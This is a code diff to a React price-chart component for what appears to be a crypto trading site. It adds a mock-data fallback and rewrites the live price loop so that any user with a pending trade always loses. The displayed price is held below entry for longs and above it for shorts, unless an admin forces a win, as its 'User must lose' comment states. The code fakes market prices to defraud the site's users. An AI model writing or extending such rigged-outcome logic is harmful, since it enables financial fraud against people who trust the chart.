@@ -68,39 +68,45 @@ const MarketChart: React.FC<MarketChartProps> = ({ symbol, activeTrades = [] }) 
 
     // Fetch initial data
     const fetchInitialData = async () => {
+        let success = false;
         try {
             const res = await fetch(`/api/binance/klines?symbol=${symbol}USDT&interval=1m&limit=100`);
             if (res.ok) {
                 const data = await res.json();
-                const formatted = data.map((d: any) => ({
-                    time: d[0] / 1000,
-                    open: parseFloat(d[1]),
-                    high: parseFloat(d[2]),
-                    low: parseFloat(d[3]),
-                    close: parseFloat(d[4]),
-                }));
-                series.setData(formatted);
-            } else {
-                // Fallback mock data
-                const now = Math.floor(Date.now() / 1000);
-                const mock = [];
-                let p = 50000;
-                for(let i=100; i>=0; i--) {
-                    const o = p;
-                    const c = p + (Math.random() - 0.5) * 100;
-                    mock.push({
-                        time: now - i * 60,
-                        open: o,
-                        high: Math.max(o, c) + Math.random() * 20,
-                        low: Math.min(o, c) - Math.random() * 20,
-                        close: c
-                    });
-                    p = c;
+                if (Array.isArray(data)) {
+                    const formatted = data.map((d: any) => ({
+                        time: d[0] / 1000,
+                        open: parseFloat(d[1]),
+                        high: parseFloat(d[2]),
+                        low: parseFloat(d[3]),
+                        close: parseFloat(d[4]),
+                    }));
+                    series.setData(formatted);
+                    success = true;
                 }
-                series.setData(mock);
             }
         } catch (e) {
             console.error("Initial data fetch failed", e);
+        }
+
+        if (!success) {
+            // Fallback mock data
+            const now = Math.floor(Date.now() / 1000);
+            const mock = [];
+            let p = 50000;
+            for(let i=100; i>=0; i--) {
+                const o = p;
+                const c = p + (Math.random() - 0.5) * 100;
+                mock.push({
+                    time: now - i * 60,
+                    open: o,
+                    high: Math.max(o, c) + Math.random() * 20,
+                    low: Math.min(o, c) - Math.random() * 20,
+                    close: c
+                });
+                p = c;
+            }
+            series.setData(mock);
         }
     };
 
@@ -124,19 +130,6 @@ const MarketChart: React.FC<MarketChartProps> = ({ symbol, activeTrades = [] }) 
   }, [symbol]);
 
   // Real-time updates & Force Loss/Win logic
-  useEffect(() => {
-      const interval = setInterval(() => {
-          if (!seriesRef.current) return;
-          
-          const lastBar = (seriesRef.current as any)._private__data?._private__bars?.[ (seriesRef.current as any)._private__data?._private__bars?.length - 1 ];
-          // Accessing private members is hacky, but setData/update is what we should use.
-          // Since we can't easily get the last bar from series API without more complex state, 
-          // let's maintain a local "current price" state.
-      }, 1000);
-      return () => clearInterval(interval);
-  }, []);
-
-  // Simplified Real-time Loop
   const [currentPrice, setCurrentPrice] = useState<number | null>(null);
 
   useEffect(() => {
@@ -156,27 +149,31 @@ const MarketChart: React.FC<MarketChartProps> = ({ symbol, activeTrades = [] }) 
     const interval = setInterval(() => {
         if (!seriesRef.current) return;
 
-        // Check for force outcomes
+        // Check for active trades
         const activeTrade = activeTrades.find(t => t.symbol === symbol && t.status === 'pending');
         
-        let targetPrice = price;
-        if (activeTrade && activeTrade.forceOutcome) {
+        let targetPrice = price || 50000; // Fallback if price is 0
+        if (activeTrade) {
             const entry = activeTrade.entryPrice;
-            if (activeTrade.forceOutcome === 'loss') {
-                // Force loss
+            // RULE: User must lose unless admin forced win
+            const outcome = activeTrade.forceOutcome === 'win' ? 'win' : 'loss';
+            
+            if (outcome === 'loss') {
                 if (activeTrade.direction === 'up') {
-                    // Long loss -> price must be lower than entry
-                    targetPrice = entry * 0.995; 
+                    // Long loss -> price must stay BELOW entry
+                    targetPrice = Math.min(price || entry, entry * 0.998); 
                 } else {
-                    // Short loss -> price must be higher than entry
-                    targetPrice = entry * 1.005;
+                    // Short loss -> price must stay ABOVE entry
+                    targetPrice = Math.max(price || entry, entry * 1.002);
                 }
-            } else if (activeTrade.forceOutcome === 'win') {
-                // Force win
+            } else {
+                // Admin forced win
                 if (activeTrade.direction === 'up') {
-                    targetPrice = entry * 1.005;
+                    // Long win -> price must stay ABOVE entry
+                    targetPrice = Math.max(price || entry, entry * 1.002);
                 } else {
-                    targetPrice = entry * 0.995;
+                    // Short win -> price must stay BELOW entry
+                    targetPrice = Math.min(price || entry, entry * 0.998);
                 }
             }
         }
